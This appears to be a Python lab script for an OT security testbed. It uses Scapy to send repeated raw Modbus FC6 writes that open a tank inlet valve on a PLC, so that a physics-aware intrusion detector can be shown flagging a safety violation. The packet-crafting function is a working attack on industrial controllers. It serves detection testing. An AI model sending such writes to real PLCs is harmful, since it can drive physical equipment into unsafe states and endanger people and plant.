#!/usr/bin/env python3
"""
OT Security Lab - Physics-Aware Violation Simulator (real Modbus stimulus)

Sends genuine Modbus/TCP FC6 "Write Single Register" commands that open the
intake inlet valve (HR 0 = 1), repeated across the tank fill cycle. No process
state is injected: the gateway's physics-aware IDS shadows the live tank level
from the real PLC -> HMI Modbus responses, so a write is flagged whenever the
tank is above the safety envelope.

The writes originate from the Level 4 attacker and are denied by the zone
firewall at the PLC boundary, but are still observed by the gateway IDS -
demonstrating that a dropped attack is not an undetected attack.
"""
import os
import sys
import time

try:
    from scapy.all import IP, TCP, Raw, send
except ImportError:
    print("Error: Scapy not found.")
    sys.exit(1)

PLC_IP = os.getenv("OT_PLC_IP", "172.21.0.10")
MODBUS_PORT = 502
ATTEMPTS = int(os.getenv("OT_UNSAFE_ATTEMPTS", "20"))
INTERVAL = float(os.getenv("OT_UNSAFE_INTERVAL", "0.5"))


def send_open_valve():
    # Modbus FC6: write reg 0 = 1 (open the inlet valve).
    # MBAP: TransID 1, Proto 0, Length 6, Unit 1; PDU: FC 6, reg 0, value 1.
    payload = b"\x00\x01\x00\x00\x00\x06\x01" + b"\x06\x00\x00\x00\x01"
    send(IP(dst=PLC_IP) / TCP(dport=MODBUS_PORT) / Raw(load=payload), verbose=False)


print("--- Starting Physics-Aware Violation Simulation (real Modbus writes) ---")
print(f"[STIMULUS] Sending {ATTEMPTS} real Modbus FC6 OPEN Inlet Valve commands...")
for _ in range(ATTEMPTS):
    send_open_valve()
    time.sleep(INTERVAL)

print("\n--- Simulation Complete. Check logs for PROCESS_SAFETY_VIOLATION. ---")
